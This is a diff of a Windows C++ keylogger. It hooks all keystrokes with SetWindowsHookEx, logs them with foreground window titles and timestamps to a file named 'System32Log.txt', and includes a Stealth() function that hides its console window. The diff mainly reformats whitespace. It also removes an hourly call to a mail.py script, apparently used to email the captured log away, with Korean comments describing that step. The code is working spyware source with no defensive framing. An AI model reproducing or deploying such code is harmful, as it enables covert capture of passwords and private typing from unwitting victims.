@@ -1,5 +1,3 @@
-#define _CRT_SECURE_NO_WARNINGS
-
 #include <Windows.h>
 #include <time.h>
 #include <iostream>
@@ -19,8 +17,6 @@ KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke, char *file);
 
-time_t start_time;
-
 extern char lastwindow[256];
 
 // This is the callback function. Consider it the event that is raised when, in this case, 
@@ -34,7 +30,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-
+			
 			// save to file
 			Save(kbdStruct.vkCode, "System32Log.txt");
 		}
@@ -63,35 +59,34 @@ void ReleaseHook()
 
 int Save(int key_stroke, char *file)
 {
-	char lastwindow[256];
-	time_t current_time;
-
+    char lastwindow[256];
+    
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0; // ignore mouse clicks
-
-
+	
+	
 	FILE *OUTPUT_FILE;
 	OUTPUT_FILE = fopen(file, "a+");
-
-
+		
+	
 	HWND foreground = GetForegroundWindow();
-	if (foreground)
-	{
-		char window_title[256];
-		GetWindowText(foreground, window_title, 256);
-
-		if (strcmp(window_title, lastwindow) != 0) {
-			strcpy(lastwindow, window_title);
-
-			// get time
-			time_t t = time(NULL);
-			struct tm *tm = localtime(&t);
-			char s[64];
-			strftime(s, sizeof(s), "%c", tm);
-
-			fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
-		}
-	}
+    if (foreground)
+    {
+        char window_title[256];
+        GetWindowText(foreground, window_title, 256);
+        
+        if(strcmp(window_title, lastwindow)!=0) {
+            strcpy(lastwindow, window_title);
+            
+            // get time
+            time_t t = time(NULL);
+            struct tm *tm = localtime(&t);
+            char s[64];
+            strftime(s, sizeof(s), "%c", tm);
+            
+            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
+        }
+    }
 
 
 	std::cout << key_stroke << '\n';
@@ -132,9 +127,9 @@ int Save(int key_stroke, char *file)
 		if (key_stroke >= 96 && key_stroke <= 105)
 		{
 			key_stroke -= 48;
-		}
+			}
 		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
-														 // check caps lock
+													// check caps lock
 			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
 			// check shift key
@@ -145,32 +140,22 @@ int Save(int key_stroke, char *file)
 			if (lowercase) key_stroke += 32;
 		}
 		fprintf(OUTPUT_FILE, "%c", key_stroke);
-	}
+    }
 	// NOTE: Numpad-Keys seem to print as lowercase letters
 
 	fclose(OUTPUT_FILE);
-
-	time(&current_time); //현재 시간을 측정
-	
-	if (current_time - start_time < 3600); //1시간이 지나지 않았으면 아무것도 수행하지 않음
-	else // 1시간이 지났을 때
-	{
-		system("C:\\Python27\\mail.py");//mail.py 경로 지정해야 함. //메일 보냄
-		start_time = time(&start_time); //start_time을 다시 현재 시간으로 바꿈
-	}
-
 	return 0;
 }
 
 void Stealth()
 {
-#ifdef visible
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
-#endif // visible
+	#ifdef visible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+	#endif // visible
 
-#ifdef invisible
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
-#endif // invisible
+	#ifdef invisible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+	#endif // invisible
 }
 
 int main()
@@ -181,8 +166,6 @@ int main()
 	// Set the hook
 	SetHook();
 
-	time(&start_time); //처음 시작 시간을 재는 함수
-	
 	// loop to keep the console application running.
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
